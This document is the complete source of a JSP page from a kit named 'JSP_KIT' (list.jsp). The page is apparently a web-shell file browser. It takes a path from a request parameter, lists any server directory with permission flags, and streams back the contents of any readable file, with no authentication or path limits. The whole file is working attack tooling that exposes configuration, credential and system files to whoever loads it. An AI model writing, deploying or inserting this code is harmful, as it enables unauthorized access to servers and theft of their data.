<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// list.jsp = Directory & File View
//
// by: Sierra
// modified: 27/06/2003
//
%>
<%
if(request.getParameter("file")==null) {
	%>
	<HTML><BODY>
	<FORM METHOD="POST" NAME="myform" ACTION="">
	<INPUT TYPE="text" NAME="file">
	<INPUT TYPE="submit" VALUE="Send">
	</FORM>
	<%
	}
%>
<% //read the file name.
try { 
File f = new File(request.getParameter("file"));
if(f.isDirectory()) {
	int i;
	String fname = new String("Unknown");
	String fcolor = new String("Black");
	%>
	<HTML><BODY>
	<FONT Face="Courier New, Helvetica" Color="Black">
	<%
	out.print("<B>Path: <U>" + f.toString() + "</U></B><BR> <BR>");
	File flist[] = f.listFiles();
	for(i=0; i<flist.length; i++) {
		fname = new String( flist[i].toString());
		out.print("(");
		if(flist[i].isDirectory() == true) {
			out.print("d");
			fname = fname + "/";
			fcolor = new String("Blue");
			} else if( flist[i].isFile() == true ) {
			out.print("-");
			fcolor = new String("Green");
			} else {
			out.print("?");
			fcolor = new String("Red");
			}
		if(flist[i].canRead() == true) out.print("r" ); else out.print("-");
		if(flist[i].canWrite() == true) out.print("w" ); else out.print("-");
		out.print(") <A Style='Color: " + fcolor.toString() + ";' HRef='?file=" + fname.toString() + "'>" + fname.toString() + "</A> " + "( Size: " + flist[i].length() + " bytes)<BR>\n");
		}
	%>
	</FONT></BODY></HTML>
	<%

	} else {
	if(f.canRead() == true) {
		InputStream in = new FileInputStream(f);
		ServletOutputStream outs = response.getOutputStream();
		int left = 0;
			try {
			while((left) >= 0 ) {
				left = in.read(); 
				outs.write(left);
				}
			} catch(IOException ex) {ex.printStackTrace();}
		outs.flush();
		outs.close();
		in.close();	
		} else {
		out.print("Can't Read file<BR>");
		}
	}
} catch(Exception ex) {ex.printStackTrace();}
%>